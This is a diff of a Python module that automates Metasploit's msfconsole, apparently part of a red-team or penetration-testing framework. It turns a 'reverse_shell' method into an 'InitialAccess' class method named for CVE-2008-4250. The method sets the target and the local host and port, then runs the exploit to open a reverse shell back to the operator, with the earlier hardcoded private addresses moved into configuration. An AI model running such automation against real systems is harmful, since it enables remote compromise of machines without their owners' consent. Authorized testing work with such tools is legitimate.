@@ -1,7 +1,4 @@
 
-# Extension of msf console module
-# Provides collection of automated msfconsole methods
-
 import os
 import re
 import time
@@ -15,18 +12,20 @@ import config
 ################################################################################
 
 load_dotenv()
-MSF_REV_SHELL_PORT = os.getenv('MSF_REV_SHELL_PORT')
+MSF_LHOST = os.getenv('MSF_LHOST')
+MSF_LPORT = os.getenv('MSF_LPORT')
+
 
 ################################################################################
-# Msf Console Command Class - containing msf methods
+# Initial access exploits
 ################################################################################
 
-class MsfExploits(object):
+class InitialAccess(object):
     """
-    Defines a collection of automated MsfConsole exploits.
+    Defines a collection initial access exploits
     """
 
-    def reverse_shell(self):
+    def exploit_cve_2008_4250(self, target_name):
         """
         Create a reverse shell with target
         """
@@ -36,11 +35,11 @@ class MsfExploits(object):
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         cmd = "set TARGET 6"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
-        cmd = "set RHOST 10.91.251.103"
+        cmd = "set RHOST " + config.TARGETS[target_name].ip
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
-        cmd = "set LHOST 10.91.251.190"
+        cmd = "set LHOST " + MSF_LHOST
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
-        cmd = "set LPORT 8080"
+        cmd = "set LPORT " + MSF_LPORT
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         cmd = "exploit"
         config.MSFCONSOLE.set_shell()
